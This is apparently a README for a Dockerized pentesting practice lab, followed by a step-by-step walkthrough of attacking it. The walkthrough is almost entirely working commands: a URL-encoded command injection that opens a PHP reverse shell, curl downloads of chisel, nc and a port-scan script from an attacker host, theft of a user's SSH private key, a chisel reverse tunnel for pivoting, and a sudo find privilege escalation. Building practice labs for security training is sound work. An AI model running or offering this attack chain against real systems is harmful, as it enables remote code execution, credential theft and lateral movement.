# Dockerized pentesting environment
Dockerized python-php environment to test your skills in pentesting

## Build

```console
docker pull php:apache
docker save php:apache -o php.tar
docker build -t dind .
```

## Run

```console
docker run -it --rm --name dind -p 31337:31337 --privileged dind
```

## Initial foothold

```console
rlwrap nc -lvnp 4444
```

```console
curl 'http://localhost:31337/?format=;php%20-r%20%27%24sock%3Dfsockopen(%22172.17.0.1%22%2C4444)%3Bexec(%22%2Fbin%2Fbash%20-i%20%3C%263%20%3E%263%202%3E%263%22)%3B%27' --compressed -H 'Connection: keep-alive'
```


```console
curl http://172.17.0.1:8000/chisel -o chisel
curl http://172.17.0.1:8000/nc -o nc
curl http://172.17.0.1:8000/portscan.sh -o portscan.sh
chmod +x chisel nc portscan.sh
```

## Pivot

```
cat /mike/.ssh/id_rsa
```
```
./chisel server --reverse
```

```
./chisel client --max-retry-count=2 172.17.0.1:8080 R:2222:172.18.0.1:22
```

```
ssh -i mike_id_rsa mike@localhost -p2222
```


## Privesc

```
sudo /usr/bin/find . -exec /bin/bash \; -quit
```